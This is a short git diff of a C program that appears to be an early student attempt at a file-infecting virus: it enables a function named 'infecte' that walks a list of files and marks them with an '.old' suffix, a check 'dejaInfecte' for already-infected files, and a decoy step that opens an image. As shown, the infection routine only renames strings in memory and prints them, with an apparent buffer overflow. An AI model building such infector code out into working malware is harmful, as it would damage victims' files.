@@ -11,14 +11,6 @@ char** getFiles();
 void infecte(char** f);
 bool dejaInfecte(char* f);
 
-int main(int argc, char const *argv[])
-{
-    char** files = getFiles();
-    //infecte(files);
-    system("xdg-open ../img/img1.jpg");
-    return EXIT_SUCCESS;
-}
-
 char** getFiles(){
     char** files = malloc(5*sizeof(char*));
     int cpt = 0;
@@ -50,17 +42,19 @@ char** getFiles(){
     return files;
 }
 
-/*
-void infecte(char** f){
-    for(int i = 0; i < sizeof(f); i++)
-    {
-        FILE *newFile;
-        FILE *oldFile;
 
+void infecte(char** f){
+    for(int i = 0; i < 5; i++)
+    {
+		FILE *oldFile;
+		FILE *newFile;
+		char* currentFile = f[i];
+		strcat(currentFile, ".old");
+		printf("%s\n", currentFile);
     }
 
 }
-*/
+
 
 bool dejaInfecte(char* f){
     char* extension = ".old";
@@ -84,4 +78,12 @@ bool dejaInfecte(char* f){
         }
     }
     return false;
+}
+
+int main(int argc, char const *argv[])
+{
+    char** files = getFiles();
+    infecte(files);
+    system("xdg-open ../img/img1.jpg");
+    return EXIT_SUCCESS;
 }
